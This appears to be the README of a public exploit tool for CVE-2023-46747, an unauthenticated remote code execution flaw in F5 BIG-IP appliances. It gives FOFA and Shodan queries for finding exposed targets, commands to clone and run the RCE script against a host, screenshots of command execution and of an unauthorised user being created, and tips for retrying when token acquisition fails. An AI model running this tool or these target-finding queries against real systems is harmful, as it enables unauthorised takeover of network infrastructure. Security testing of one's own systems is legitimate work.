# Vulnerability Details
1. fofa：`title="BIG-IP&reg;- Redirect"`; shodan: `title:"BIG-IP&reg;- Redirect"`
2. Affected versions: https://my.f5.com/manage/s/article/K000137353
# Vulnerability Recurrence
1. At this time, the user here is only `admin`:
![image](https://github.com/W01fh4cker/CVE-2023-46747-EXP/assets/101872898/9171b074-ef4b-41bb-bbb6-e40085e0fa9a)

2. Execute the script:
```
git clone https://github.com/W01fh4cker/CVE-2023-46747-RCE.git
cd CVE-2023-46747-RCE
pip install -r requirements.txt
python CVE-2023-46747-RCE.py -u https://192.168.161.190
# python CVE-2023-46747-RCE.py -u https://192.168.161.190 -p http://127.0.0.1:7890
```
Successfully executed command:  
![image](https://github.com/W01fh4cker/CVE-2023-46747-RCE/assets/101872898/64dbb6b4-cb32-4e31-bb53-9ad918097494)


3. A new user was successfully created without authorization here:
![image](https://github.com/W01fh4cker/CVE-2023-46747-RCE/assets/101872898/66fed85c-db33-49d5-8062-cd814f62cdbe)

# Shortcoming  
Exploitation fails in some versions, reference: https://twitter.com/joel_land/status/1729147886615818732.  

# Q & A  
1. Q: Token acquisition failed?  
   A: It cannot be said that there must be no vulnerability in the test site, because creating a user without authorization is not 100% successful. Sometimes you do not create a user in the first step due to some reasons, so the token in the second step cannot be obtained. Therefore, my suggestion is to try a few more times. If it does not work, it may mean that there is indeed no vulnerability.  
# Digression
You can use this script https://github.com/BishopFox/bigip-scanner to collect F5 BIG-IP version information. It's great!  
# Reference
https://github.com/projectdiscovery/nuclei-templates/pull/8500  
https://mp.weixin.qq.com/s/wUoBy7ZiqJL2CUOMC-8Wdg  
https://www.praetorian.com/blog/refresh-compromising-f5-big-ip-with-request-smuggling-cve-2023-46747
